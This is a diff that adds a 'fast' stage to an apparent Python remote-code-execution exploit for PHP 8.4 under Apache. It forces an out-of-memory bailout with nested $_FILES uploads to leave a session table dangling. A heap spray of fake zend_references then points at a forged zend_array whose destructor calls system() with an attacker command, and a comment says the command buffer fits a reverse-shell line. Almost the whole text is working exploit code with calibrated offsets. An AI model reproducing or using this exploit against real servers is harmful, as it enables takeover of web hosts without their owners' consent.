@@ -561,6 +561,178 @@ class Fire:
 
 
 # --------------------------------------------------------------------------
+# stage 3 (fast): 9bie-class amplification arm + fake-reference fire
+# --------------------------------------------------------------------------
+# Credit: 9bie - github.com/9bie/php2shell-bypass-aslr-exp. The slow stock chain
+# above streams ~128 MB per request to drive Zend-MM real_size to memory_limit;
+# this reaches the same OOM with a few hundred KB of deeply nested
+# empty-filename $_FILES parts (each materialises ~151 KB of nested HashTables,
+# ~320x heap-per-wire), so each request is ~2 s instead of ~30-60 s on a remote
+# target. The OOM bailout is non-corrupting (the prefork child survives), so no
+# crash-rotate between fires is needed. The fire reoccupies the dangling
+# PS(http_session_vars) with a double-sided spray of fake zend_references (one
+# every 32 bytes) that point at a 384-byte fake zend_array (pDestructor =
+# zif_system) placed at chunk + FAST_S_OFFSET; its destruction calls
+# system(cmd). FAST_S_OFFSET is build-specific (chunk-relative) - the value
+# below is calibrated for stock php:8.4.26-apache amd64 (recalibrate per build,
+# e.g. by reading PS(http_session_vars) via /proc/<worker>/mem after the arm).
+FAST_S_OFFSET = 0xF5398
+AMP_PARTS = 880
+AMP_DEPTH = 64
+AMP_FILLERS = 115
+FAST_VL = 384
+FAST_N1 = 500
+FAST_N2 = 495
+FAST_BOUNDARY = b"C" * 10
+FAST_MAX_COMMAND = 0x160 - 0x98        # 200 bytes (fits a full reverse-shell line)
+
+
+class Fast:
+    """Amplification-arm + fake-reference fire (9bie technique, ported native).
+
+    Shares the Leak above; only the arm (OOM) and fire differ from Fire. One
+    leak, then arm+fire per attempt, each a single light request -> lands in
+    ~1-2 fires instead of the slow chain's many ~130 s rotate+fire attempts.
+    """
+
+    def __init__(self, endpoint: Endpoint, zif: int, verbose: bool) -> None:
+        self.http = endpoint
+        self.zif = zif
+        self.verbose = verbose
+
+    def log(self, msg: str) -> None:
+        if self.verbose:
+            print(msg, file=sys.stderr, flush=True)
+
+    def _send(self, body: bytes, timeout: float = 120.0) -> bytes:
+        head = (
+            f"POST {self.http.path} HTTP/1.1\r\n"
+            f"Host: {self.http.host_override or self.http.host_header}\r\n"
+            f"Content-Type: multipart/form-data; boundary={FAST_BOUNDARY.decode()}\r\n"
+            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
+        sock = self.http._connect()
+        sock.settimeout(timeout)
+        out = bytearray()
+        try:
+            try:
+                sock.sendall(head + body)
+                while len(out) < (1 << 20):
+                    block = sock.recv(65536)
+                    if not block:
+                        break
+                    out.extend(block)
+            except OSError:
+                pass                       # OOM bails out mid-request
+        finally:
+            sock.close()
+        return bytes(out)
+
+    @staticmethod
+    def _part(name: bytes, value: bytes = b"", filename: bytes | None = None,
+              ctype: bytes | None = None) -> bytes:
+        out = bytearray(b"--" + FAST_BOUNDARY + b"\r\n"
+                        b'Content-Disposition: form-data; name="' + name + b'"')
+        if filename is not None:
+            out += b'; filename="' + filename + b'"'
+        if ctype is not None:
+            out += b"\r\nContent-Type: " + ctype
+        out += b"\r\n\r\n" + value + b"\r\n"
+        return bytes(out)
+
+    def arm(self, sid: bytes = b"a" * 32, progress: bytes = b"k0",
+            parts: int = AMP_PARTS, depth: int = AMP_DEPTH,
+            fillers: int = AMP_FILLERS) -> None:
+        """Nested empty-filename $_FILES amplification -> OOM (non-corrupting)."""
+        body = bytearray()
+        body += self._part(b"PHPSESSID", sid)
+        body += self._part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
+        for i in range(fillers):
+            body += self._part(b"%03d" % i, b"x")
+        for i in range(parts):
+            name = (b"files[R%05d]" % i) + b"[a]" * (depth - 2)
+            body += self._part(name, b"", filename=b"",
+                               ctype=b"application/octet-stream")
+        body += b"--" + FAST_BOUNDARY + b"--\r\n"
+        self._send(bytes(body))
+        time.sleep(0.2)
+
+    def carrier(self, htdata: int, zif: int, cmd: bytes) -> bytes:
+        """384-byte fake zend_array: pDestructor=zif_system, cmd string at +0x98."""
+        ht = bytearray(FAST_VL)
+        struct.pack_into("<II", ht, 0x00, 1, 7)
+        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
+        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
+        struct.pack_into("<II", ht, 0x18, 1, 1)
+        struct.pack_into("<II", ht, 0x20, 8, 0)
+        struct.pack_into("<Q", ht, 0x28, 0)
+        struct.pack_into("<Q", ht, 0x30, zif)
+        E = 0x20
+        struct.pack_into("<Q", ht, E + 0x00, 0)
+        struct.pack_into("<Q", ht, E + 0x08, 0)
+        struct.pack_into("<Q", ht, E + 0x10, zif)
+        struct.pack_into("<Q", ht, E + 0x18, 0)
+        struct.pack_into("<Q", ht, E + 0x20, 0)
+        struct.pack_into("<I", ht, E + 0x28, 0)
+        struct.pack_into("<I", ht, E + 0x2C, 1)
+        struct.pack_into("<Q", ht, E + 0x30, 0)
+        struct.pack_into("<Q", ht, E + 0x38, 0)
+        struct.pack_into("<I", ht, E + 0x40, 0)
+        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
+        struct.pack_into("<I", ht, E + 0x58, 6)
+        struct.pack_into("<II", ht, 0x80, 1, 0x106)
+        struct.pack_into("<Q", ht, 0x88, 0)
+        struct.pack_into("<Q", ht, 0x90, len(cmd))
+        ht[0x98:0x98 + len(cmd)] = cmd
+        ht[0x98 + len(cmd)] = 0
+        return bytes(ht)
+
+    @staticmethod
+    def _spray(ptr: int, vl: int = FAST_VL) -> bytes:
+        """vl-byte value holding a fake zend_reference -> ptr every 32 bytes."""
+        v = bytearray(b"S" * vl)
+        ref = bytearray(32)
+        struct.pack_into("<I", ref, 0, 1)      # refcount = 1
+        ref[4] = 0x0A                           # IS_REFERENCE
+        struct.pack_into("<Q", ref, 8, ptr)
+        struct.pack_into("<I", ref, 16, 0x0107)
+        off = 8
+        while off + 32 <= vl:
+            v[off:off + 32] = ref
+            off += 32
+        return bytes(v)
+
+    @staticmethod
+    def _sname(prefix: bytes, i: int, nlen: int = 10) -> bytes:
+        return (prefix + (b"%09d" % i) + b"x" * nlen)[:nlen]
+
+    def fire(self, table_address: int, system_address: int, command: bytes,
+             sid: bytes = b"a" * 32, progress: bytes = b"k0",
+             n1: int = FAST_N1, n2: int = FAST_N2) -> bytes:
+        spray = self._spray(table_address)
+        ht = self.carrier(table_address, system_address, command)
+        body = bytearray()
+        for i in range(n1):
+            body += self._part(self._sname(b"s", i), spray)
+        body += self._part(b"ht", ht)
+        body += self._part(b"PHPSESSID", sid)
+        body += self._part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
+        for i in range(n2):
+            body += self._part(self._sname(b"t", i), spray)
+        body += b"--" + FAST_BOUNDARY + b"--\r\n"
+        return self._send(bytes(body), timeout=30.0)
+
+    def run(self, heap: int, module: int, command: bytes,
+            s_offset: int = FAST_S_OFFSET) -> None:
+        table_address = heap + s_offset
+        system_address = module + self.zif
+        self.log(f"fast: arm + fire table={table_address:#x} "
+                 f"system={system_address:#x} cmd={command!r}")
+        self.arm()
+        self.fire(table_address, system_address, command)
+        time.sleep(0.4)
+
+
+# --------------------------------------------------------------------------
 def parse_headers(spec: str) -> bytes:
     if not spec:
         return b""
